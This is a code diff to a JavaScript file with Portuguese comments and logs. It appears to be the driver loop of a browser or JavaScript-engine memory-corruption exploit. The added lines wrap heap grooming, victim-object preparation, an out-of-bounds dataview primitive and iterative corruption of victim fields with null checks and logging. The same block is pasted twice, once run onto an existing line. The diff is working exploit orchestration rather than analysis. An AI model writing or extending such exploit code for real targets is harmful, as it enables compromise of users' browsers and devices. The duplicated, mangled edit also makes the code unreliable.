@@ -42,9 +42,46 @@ const App = {
                 if (!Core.oob_dataview_real) { appLog("Falha OOB, pulando estratégia.", "error", FNAME_STRAT); continue; }
                 await Groomer.groomHeapForSameSize(spray_count + strat.spray_adj, currentOOBAllocationSize, intermediate_allocs + strat.inter_adj, false);
                 victimPrepared = await Groomer.prepareVictim(currentOOBAllocationSize);
+                if (!victimPrepared) {
+    appLog(`Falha ao preparar vítima (victimPrepared é false) para estratégia '${strat.name}'. Pulando corrupção. Tamanho usado: ${currentOOBAllocationSize}`, "error", FNAME_STRAT);
+    // O 'continue;' já está lá e deve ser mantido
+} else if (!Groomer.victim_object) {
+    // Esta condição é crucial se victimPrepared for true, mas victim_object ainda for null
+    appLog(`ALERTA: victimPrepared é true, MAS Groomer.victim_object é null para '${strat.name}'. Tamanho usado: ${currentOOBAllocationSize}. Pulando corrupção.`, "error", FNAME_STRAT);
+    // Adicione um 'continue;' aqui também, por segurança, embora o check posterior também deva pegar.
+    continue;
+} else {
+    appLog(`Vítima preparada com sucesso para '${strat.name}'. victim_object.length: ${Groomer.victim_object.length}`, "good", FNAME_STRAT);
+}
+
+// A verificação que já existia:
+if (!Groomer.victim_object) {
+     appLog(`ERRO CRÍTICO FINAL CHECK: Groomer.victim_object é null ANTES de chamar findAndCorrupt. Estratégia: '${strat.name}'. Pulando.`, "error", FNAME_STRAT);
+     continue;
+}
+appLog(`Chamando findAndCorrupt para '${strat.name}'...`, "info", FNAME_STRAT);
+await Corruptor.findAndCorruptVictimFields_Iterative();
             } else {
                 await Groomer.groomHeapForSameSize(spray_count + strat.spray_adj, currentOOBAllocationSize, intermediate_allocs + strat.inter_adj, true);
-                victimPrepared = await Groomer.prepareVictim(currentOOBAllocationSize);
+                victimPrepared = await Groomer.prepareVictim(currentOOBAllocationSize);if (!victimPrepared) {
+    appLog(`Falha ao preparar vítima (victimPrepared é false) para estratégia '${strat.name}'. Pulando corrupção. Tamanho usado: ${currentOOBAllocationSize}`, "error", FNAME_STRAT);
+    // O 'continue;' já está lá e deve ser mantido
+} else if (!Groomer.victim_object) {
+    // Esta condição é crucial se victimPrepared for true, mas victim_object ainda for null
+    appLog(`ALERTA: victimPrepared é true, MAS Groomer.victim_object é null para '${strat.name}'. Tamanho usado: ${currentOOBAllocationSize}. Pulando corrupção.`, "error", FNAME_STRAT);
+    // Adicione um 'continue;' aqui também, por segurança, embora o check posterior também deva pegar.
+    continue;
+} else {
+    appLog(`Vítima preparada com sucesso para '${strat.name}'. victim_object.length: ${Groomer.victim_object.length}`, "good", FNAME_STRAT);
+}
+
+// A verificação que já existia:
+if (!Groomer.victim_object) {
+     appLog(`ERRO CRÍTICO FINAL CHECK: Groomer.victim_object é null ANTES de chamar findAndCorrupt. Estratégia: '${strat.name}'. Pulando.`, "error", FNAME_STRAT);
+     continue;
+}
+appLog(`Chamando findAndCorrupt para '${strat.name}'...`, "info", FNAME_STRAT);
+await Corruptor.findAndCorruptVictimFields_Iterative();
                 // Somente ativa OOB *depois* do grooming e vítima, se a vítima foi preparada
                 if (victimPrepared) {
                     await Core.triggerOOB_primitive();
